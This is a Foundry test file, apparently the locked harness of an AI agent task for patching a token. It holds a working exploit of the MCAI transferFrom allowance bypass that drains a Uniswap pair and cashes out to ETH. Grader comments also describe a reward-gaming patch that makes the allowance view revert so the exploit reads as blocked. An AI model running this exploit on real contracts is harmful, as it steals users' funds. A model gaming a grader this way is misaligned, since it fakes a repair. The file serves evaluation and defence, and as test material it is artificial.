// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// HARNESS FILE — hash-locked, read-only. The agent must NOT edit this file.
// PoC for the MCAI transferFrom allowance bypass (Ethereum mainnet, 2025-01).
// Adapted from DeFiHackLabs src/test/2025-01/MCAI_exp.sol.
//
// State-replay model: forks TASK_FORK_URL (the fail-closed record/replay proxy) at the
// incident block and vm.etch'es the code compiled from src/contracts/Token.sol onto the
// live MCAI address, so the agent's SOURCE governs the exploit while real storage
// (balances, the pair, the tax wallet, tax settings) is preserved from the fork.

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
    ) external;
}

address constant ATTACKER = 0x0C8ecf2BbF9361fa2DD0Bd29ea473FB790aB7fEE;
address constant TAX_WALLET = 0xdDF062714911A2e59996Eb94A57b7040Ea44309D;
address constant MCAI = 0x810B5902CB2ac2Fa63dFE4A6935EA32aED975cc8;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant PAIR = 0x660a6619574e87d12Ba7Fa3F5679D5D7F587A4fE;
address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

contract MCAI_PoC is Test {
    uint256 constant FORK_BLOCK = 21720380;
    // The real incident took 12.03 WETH. A correct patch makes the drain revert, so the
    // attacker never gets anywhere near this.
    uint256 constant PROFIT_THRESHOLD = 11 ether;

    MCAIExploit exploit;

    function setUp() public {
        string memory url = vm.envOr("TASK_FORK_URL", string("mainnet"));
        try vm.createSelectFork(url, FORK_BLOCK) { } catch { vm.createSelectFork(url); }
        vm.etch(MCAI, vm.getDeployedCode("Token.sol:MCAI"));
        exploit = new MCAIExploit();
        vm.deal(ATTACKER, 0);
    }

    // ---------------------------------------------------------------- phase discipline
    // The grader credits "exploit blocked" when this test fails for a reason the task
    // DECLARES in tests/manifest.json (recognised_block_reasons). Forge reports one reason
    // per test, with no idea which statement produced it, so a failure ANYWHERE in this
    // body could impersonate the block. The shape to guard against: a patch that leaves
    // transferFrom untouched and only makes `allowance(pair, taxWallet)` revert with
    // "ERC20: transfer amount exceeds allowance" (`allowance_query_sabotage`) would read as
    // a blocked exploit, because the PRECONDITION query would carry the recognised string.
    //
    // The guard is structural, and it is the reason for the helpers below: only ONE statement
    // in this test — the unapproved transferFrom — can produce a recognised reason. Every
    // read before it, and the monetisation after it, converts any failure into a
    // PRECONDITION_/POST_DRAIN_ reason that is deliberately NOT recognised, so it lands as
    // `inconclusive / unrecognised_failure` for a human instead of as a reward.

    function testExploit() public {
        // ---- phase 0: preconditions. A failure here is not evidence of a repair.
        // The pair never approved the tax wallet for anything. That is the whole point:
        // a correct ERC20 makes the drain below impossible.
        uint256 preApproval = _readAllowance(PAIR, TAX_WALLET);
        if (preApproval != 0) revert("PRECONDITION_NOT_MET: pair approved the tax wallet");
        uint256 pairBalance = _readBalance(PAIR);
        if (pairBalance == 0) revert("PRECONDITION_NOT_MET: pair holds no MCAI at this block");

        uint256 drainAmount = pairBalance - pairBalance / 10_000;   // leave 0.01% behind

        // ---- phase 1: THE EXPLOIT STEP. This statement, and only this statement, may
        // produce a recognised block reason: the tax wallet pulls the pair's MCAI with NO
        // allowance. A correct patch makes it revert here.
        vm.prank(TAX_WALLET, ATTACKER);
        IERC20(MCAI).transferFrom(PAIR, address(exploit), drainAmount);

        // ---- phase 2: monetisation. The drain already succeeded, so the vulnerability was
        // NOT blocked; a failure to cash out is a different fact and must not read as one.
        vm.prank(ATTACKER, ATTACKER);
        try exploit.attack() { } catch {
            revert("POST_DRAIN_FAILURE: monetisation reverted after a successful drain");
        }

        uint256 profit = ATTACKER.balance;
        emit log_named_decimal_uint("Attacker ETH profit", profit, 18);
        // EXPLOIT ORACLE: passes iff the attack is profitable. A correct patch makes the
        // unapproved transferFrom revert, so this test fails — which is the reward signal.
        assertGt(profit, PROFIT_THRESHOLD, "exploit did not yield profit (patched?)");
    }

    /// Precondition read. A sabotaged view is an unreadable precondition, never a block.
    function _readAllowance(address owner, address spender) internal view returns (uint256) {
        try IERC20(MCAI).allowance(owner, spender) returns (uint256 v) {
            return v;
        } catch {
            revert("PRECONDITION_UNREADABLE: allowance() view reverted");
        }
    }

    function _readBalance(address who) internal view returns (uint256) {
        try IERC20(MCAI).balanceOf(who) returns (uint256 v) {
            return v;
        } catch {
            revert("PRECONDITION_UNREADABLE: balanceOf() view reverted");
        }
    }
}

contract MCAIExploit {
    function attack() external {
        IUniswapV2Pair(PAIR).sync();
        IERC20(MCAI).approve(ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = MCAI;
        path[1] = WETH;
        IUniswapV2Router(ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            IERC20(MCAI).balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        (bool sent,) = payable(ATTACKER).call{value: address(this).balance}("");
        require(sent, "ETH forwarding failed");
    }

    receive() external payable {}
}
